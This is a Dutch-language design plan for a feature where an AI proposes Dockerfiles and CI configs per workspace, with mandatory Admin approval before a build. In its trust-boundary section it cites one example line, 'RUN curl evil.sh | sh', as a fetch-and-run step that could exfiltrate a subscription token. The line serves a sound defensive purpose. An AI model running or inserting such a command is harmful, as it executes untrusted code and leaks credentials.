# Image-builder — AI stelt stacks/images voor per instance (Fase 2)

> Gegenereerd 2026-06-15. Bouwplan voor "met AI de container/images maken per instance" — het stack-agnostische deel waar een gebruiker zegt *"ik wil een C#-project met MySQL"* en het systeem dat voor elkaar krijgt. Gegrond in `../src/workspaces/_docs/07b_CONTAINER_RUNTIME.md` + `../src/workspaces/_docs/SELF_HOST_INSTALLER.md` + de analyse in `../_brainstorm/modules/stack-agnostic-docker.md`.

## Doel & V1-scope

**Wat dit levert:** een **Stack-wizard** (geleid, niet volledig autonoom) waarmee een gebruiker een tech-stack kiest of beschrijft; de AI genereert een `.workspaces/Dockerfile` + `.workspaces/ci.yml` als **voorstel** (`propose_suggestion`); een **Admin keurt goed**; de Conductor bouwt het L2-image en draait de pre-warm. Plus een **stack-template-catalogus** (Node/C#/Go/Python) die de AI-authoring voor standaardgevallen overslaat.

**Wat expliciet uitgesteld:** container-registry voor multi-host (`07b §1.1` → P4), volledig autonome AI-builds, internet-facing exposure als default, exotische stacks zonder template.

**Harde grens (LOCKED, `Q-CT-DOCKERFILE-TRUST`):** het `.workspaces/Dockerfile` is **Admin-gated** — nooit een vrij UI-tekstveld dat direct bouwt, nooit een autonome AI-schrijfactie. De AI **stelt voor**, een mens **accepteert**, dan pas bouwt de **Conductor** (B-23: Conductor is de enige schrijver). Reden: een Dockerfile met `RUN curl evil.sh | sh` kan de geprojecteerde subscription-token exfiltreren. Deze grens is geen bug maar de juiste veiligheidsgrens.

## Past op de bestaande corpus

Het meeste staat al ontworpen — dit plan vult het **AI-authoring-pad** + de **UX** in.

| Bouwsteen | Doc | Status |
|---|---|---|
| Drie-laags image-model (L1 base / L2 per-project / L3 per-ticket) | `07b §1` | bestaat |
| `.workspaces/Dockerfile` als config-punt, Admin-gated | `07b §1.2` | bestaat |
| Pre-warm in L2 (`npm ci`, `dotnet restore`, …) | `07b §1.2` | bestaat |
| Stack-agnostische `StageProcess`-commando's | `01_ARCHITECTURE §7`, `07_ORCHESTRATOR §A` | bestaat |
| `propose_suggestion` → menselijke acceptatie (B-23) | `02_PROTOCOL_AND_FLOW §7` | LOCKED |
| Hardening (cap-drop ALL, non-root, pids/mem/cpu/disk caps) | `07b §7` | LOCKED |
| `docker compose up` installer + `bootstrap.sh` | `SELF_HOST_INSTALLER §0–§5` | bestaat |

**Geen nieuwe verbs:** de AI stuurt het Dockerfile-voorstel via het bestaande `propose_suggestion`. De build-actie is een nieuwe **control-API op** (`build-instance-image`) die een Conductor-actie enqueued — geen direct schrijven, geen nieuw structured-channel verb.

## Datamodel (nieuw)

```ts
model InstanceImage {
  id            String   @id
  workspaceId   String
  name          String              // 'dotnet8-mysql'
  stackTemplate String?             // 'csharp-mysql' | 'go-postgres' | … | null (custom)
  dockerfile    String              // de geaccepteerde inhoud (Admin-gated)
  ciYml         String?
  egressAllow   String[]            // per-stack egress allow-list (nuget.org, …)
  status        String              // 'proposed' | 'accepted' | 'building' | 'ready' | 'failed'
  proposedBy    String              // userId of 'ai'
  acceptedBy    String?             // Admin userId (verplicht vóór building)
  imageTag      String?             // lokale tag na build
  healthCheck   Json?               // { cmd, output, ok } na build
  createdAt     DateTime
}
```
`Workspace` krijgt een `defaultImageId`. Past op de `04b`-stijl; één model, geen migratiekoppeling met andere fases.

## UX & flows

**Stack-wizard (Settings → Instance / Container):**
1. Kies een **template** ("C# + MySQL", "Go + Postgres", "Python + Redis", "Node/TS") **of** "Beschrijf mijn stack" (vrij veld).
2. Bij een template: de Dockerfile/ci/egress-stub is direct beschikbaar (geen AI nodig). Bij vrij veld: een one-shot reasoner genereert een Dockerfile + ci.yml + egress-allow-list als **`propose_suggestion`**.
3. **Review-scherm** toont het voorstel met (optioneel) een `hadolint`/`trivy`-scan-resultaat als waarschuwingen. Een **Admin** klikt **"Accepteer & bouw"**.
4. De Conductor bouwt het L2-image, draait de **pre-warm**, en daarna een **health-check** (`dotnet --version`, `mysql --version`) → toont "✓ werkt" vóór het eerste ticket.
5. Falen → duidelijke foutboodschap (bijv. "L2 mist `dotnet`; val terug op L1 of pas de Dockerfile aan").

**Cross-device live preview** (hangt hieraan vast): de bestaande `dev-<ticketId>.<domain>` Caddy-routing (`07b §5`) krijgt **forward-auth**: een verzoek zonder geldige Workspaces-sessie wordt naar de loginpagina geredirect. Zo is een preview op elk apparaat bereikbaar zonder 'm publiek te maken.

## Bouwstappen (geordend)

1. **Datamodel + control-API** — `InstanceImage` + de `build-instance-image` control-API op (enqueued Conductor-actie, Admin-gated via `preApiExecute` RBAC).
2. **Template-catalogus** — 4 ingebouwde stack-templates (Dockerfile + ci.yml + egress-allow-list als code-fixtures). Geen AI nodig voor deze.
3. **Stack-wizard UI** — template-keuze + vrij-veld; review-scherm met accept-knop (Admin-only).
4. **AI-authoring** — one-shot reasoner die bij het vrije veld een Dockerfile-voorstel produceert via `propose_suggestion`; prompt dwingt `FROM workspaces/base:<semver>` af.
5. **Build-pipeline** — Conductor bouwt L2, draait pre-warm + health-check, schrijft `status`/`imageTag`/`healthCheck`. Hardening uit `07b §7` afdwingen.
6. **(optioneel) lint/scan** — `hadolint`/`trivy` in de review-stap als vangnet.
7. **Preview forward-auth** — Caddy forward-auth middleware → Workspaces-sessiecheck voor `dev-<id>.<domain>`.

## Risico's & open punten

- **"Het werkt gewoon" oversells.** C#/MySQL vereist nog steeds: Admin accepteert Dockerfile, (bij internet-facing) DNS + wildcard-TLS. De wizard moet dit demystificeren; LAN-only is de simpelste startpositie.
- **AI-authored Dockerfiles = supply-chain-risico.** Admin-gate is de mitigatie; de UX moet uitleggen *waarom* die gate er is. `FROM`-allowlist (`workspaces/base`) verkleint het oppervlak.
- **Geen registry in V1** → AI-gebouwde L2-images zijn lokaal; multi-host team-gebruik is een latere blocker (`07b §1.1`).
- **Preview-URL-auth was een ontwerp-gap** — dit plan dicht 'm met forward-auth; bevestig dat LAN-only de V1-default is.
- **Open (uit de module-analyse, aannames in dit plan — bevestig):** Dockerfile-autonomie = optie a (AI-voorstel + Admin-accept); preview-auth = via Workspaces-sessie; netwerk = LAN-only default; ondersteunde stacks V1 = Node/C#/Go/Python; registry = geen in V1; wizard = technisch-gerichte CLI/stap-voor-stap; Dockerfile-validatie = menselijke review (lint/scan optioneel). Deze volgen de "aanbevolen" opties uit `../_brainstorm/modules/stack-agnostic-docker.md` §Vragen.
